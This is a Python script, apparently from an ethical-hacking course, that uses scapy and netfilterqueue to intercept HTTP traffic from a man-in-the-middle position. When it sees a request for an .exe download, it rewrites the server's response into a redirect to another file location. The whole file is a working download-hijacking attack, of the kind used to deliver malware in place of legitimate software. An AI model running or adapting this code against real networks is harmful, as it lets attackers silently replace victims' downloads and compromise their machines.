#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
from pip._vendor.distlib.compat import raw_input

ip_address = raw_input("[+] Enter IP address of the server: ")

# Created ack list
list_ack = []

# Defining loader functionality
def loader(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len
    return packet

# Defining Spoofed Functionality
def spoofed_packet(packets):
    scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
    if scapy_packet.haslayer(scapy.Raw):
        # Destination Port
        if scapy_packet[scapy.TCP].dport == 10000:
            if ".exe" in scapy_packet[scapy.Raw].load and ip_address not in scapy_packet[scapy.Raw].load: # if file contains exe download
                print("[+] Request For exe made")
                list_ack.append(scapy_packet[scapy.TCP].ack) # store the ack in the list variable
        # Source Port
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in list_ack: # check if seq to the response in the ack list
                list_ack.remove(scapy_packet[scapy.TCP].seq) # remove seq in the list because we don't want to use it anymore
                print("[+] Replacing Download file")
                packet_modification = \
                    loader(scapy_packet,
                             "HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/postdownload.html?&L=0\n\n")
                packets.set_payload(str(packet_modification)) # Modify packet i.e. the function we created so it can be changed
                                                          # in the spoofed functionality.
    packets.accept()  # accept packets

queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
# the call back function
queue.run() # to run the function